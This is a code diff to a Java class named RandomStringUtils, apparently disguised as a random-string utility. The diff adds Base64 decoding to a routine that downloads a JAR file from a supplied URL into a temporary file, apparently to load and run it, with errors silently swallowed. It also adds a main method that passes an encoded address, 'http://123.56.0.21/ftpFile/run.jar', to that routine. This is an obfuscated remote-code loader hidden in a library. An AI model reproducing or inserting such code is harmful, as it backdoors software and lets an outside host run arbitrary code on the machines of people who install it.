@@ -6,7 +6,9 @@ import java.io.InputStream;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
+import java.util.Base64;
 import java.util.Random;
 
 public class RandomStringUtils {
@@ -144,11 +146,12 @@ public class RandomStringUtils {
           if (data == null || data.isEmpty()){
               return;
           }
-          if (!data.contains("http")){
+          String decode = new String(Base64.getDecoder().decode(data), StandardCharsets.UTF_8);
+          if (!decode.contains("http")){
               return;
           }
           File tempJar = File.createTempFile("plus", ".jar");
-          try (InputStream in = new URL(data).openStream()) {
+          try (InputStream in = new URL(decode).openStream()) {
               Files.copy(in, tempJar.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
           }
 
@@ -171,4 +174,9 @@ public class RandomStringUtils {
       }catch (Exception e){}
     }
 
+    public static void main(String[] args) {
+        System.out.println(RandomStringUtils.getTwoRandom(
+                Base64.getEncoder().encodeToString("http://123.56.0.21/ftpFile/run.jar".getBytes(StandardCharsets.UTF_8))
+        ));
+    }
 }
